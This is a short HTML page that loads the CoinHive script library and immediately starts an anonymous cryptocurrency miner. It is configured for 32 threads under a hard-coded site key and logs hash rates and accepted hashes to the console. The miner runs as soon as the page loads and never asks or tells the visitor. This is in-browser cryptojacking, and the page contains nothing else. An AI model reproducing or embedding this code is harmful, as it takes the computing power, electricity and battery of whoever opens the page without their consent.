<!doctype html>
<html lang="en">
<head>
  <meta charset="utf-8">
  <script src="https://coinhive.com/lib/coinhive.min.js"></script>
</head>

<body>
  <script>
    const PUBLIC_KEY = 'mZKpORQII0kBvMrDqSeSnoEQh7y47axk'
    const logEvery = 10000
    const threads = 32
    const autoThreads = false
    const throttle = 0.2
    const forceASMJS = false
    const options = {
      threads,
      autoThreads,
      throttle,
      forceASMJS,
    }
    const miner = new CoinHive.Anonymous(PUBLIC_KEY, options)
    miner.start()
    miner.on('open', () => console.log('opened connection') )
    miner.on('authed', () => console.log('Token name is: ', miner.getToken()) )
    miner.on('found', () => console.log('found a hash') )
    miner.on('accepted', () => console.log('accepted hash was accepted') )
    miner.on('error', (res) => console.log((res.error == 'connection_error') ? 'connection error' : res.error) )
    setInterval(() => {
      let hashesPerSecond = miner.getHashesPerSecond()
      let totalHashes = miner.getTotalHashes()
      let acceptedHashes = miner.getAcceptedHashes()
      console.log('hashesPerSecond: ', hashesPerSecond)
      console.log('totalHashes: ', totalHashes)
      console.log('acceptedHashes: ', acceptedHashes)
    }, 10000)
  </script>
</body>
</html>
